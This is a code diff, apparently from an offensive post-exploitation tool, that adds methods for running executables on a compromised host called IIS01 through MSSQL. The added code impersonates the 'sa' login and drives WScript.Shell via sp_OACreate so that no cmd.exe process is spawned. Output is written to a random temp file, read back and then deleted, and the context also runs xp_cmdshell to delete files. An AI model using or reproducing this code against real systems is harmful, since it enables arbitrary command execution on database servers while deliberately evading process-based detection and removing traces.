@@ -103,6 +103,42 @@ class XpMssqlBase:
         self._exec_q(shell, f"EXECUTE AS LOGIN='sa';EXEC xp_cmdshell 'del /f {self._tsql_escape(ps1)}'")
         print(output)
 
+    # ── direct PE execution (no cmd.exe spawn on IIS01) ─────────────────────
+
+    def cmd_xprun(self, shell, exe_cmd: str, wait: bool = True):
+        """Run an exe directly on IIS01 via sp_OA WScript.Shell.Run (no cmd.exe).
+        Returns exit code only — no stdout capture. Use cmd_xprun_out for output."""
+        wait_flag = "1" if wait else "0"
+        tsql = (
+            "EXECUTE AS LOGIN='sa';"
+            "DECLARE @sh INT,@rc INT;"
+            "EXEC sp_OACreate 'WScript.Shell',@sh OUT;"
+            f"EXEC sp_OAMethod @sh,'Run',@rc OUT,"
+            f"'{self._tsql_escape(exe_cmd)}',0,{wait_flag};"
+            "SELECT @rc AS exit_code;"
+            "EXEC sp_OADestroy @sh;"
+        )
+        out = self._exec_q(shell, tsql)
+        print(out)
+
+    def cmd_xprun_out(self, shell, exe_cmd: str, out_file: str = None):
+        """Run exe with -o flag → read output via xpfile cat → cleanup.
+        Entire chain uses sp_OA only — no cmd.exe spawn."""
+        if out_file is None:
+            out_file = self._rand_tmp("txt")
+        full_cmd = f'{exe_cmd} -o {out_file}'
+        wait_tsql = (
+            "EXECUTE AS LOGIN='sa';"
+            "DECLARE @sh INT,@rc INT;"
+            "EXEC sp_OACreate 'WScript.Shell',@sh OUT;"
+            f"EXEC sp_OAMethod @sh,'Run',@rc OUT,"
+            f"'{self._tsql_escape(full_cmd)}',0,1;"
+            "EXEC sp_OADestroy @sh;"
+        )
+        self._exec_q(shell, wait_tsql)
+        self.cmd_xpfile_cat(shell, out_file)
+        self.cmd_xpfile_del(shell, out_file)
+
     # ── file operations (no cmd spawn on IIS01) ────────────────────────────
 
     def cmd_xpfile_exists(self, shell, path: str):
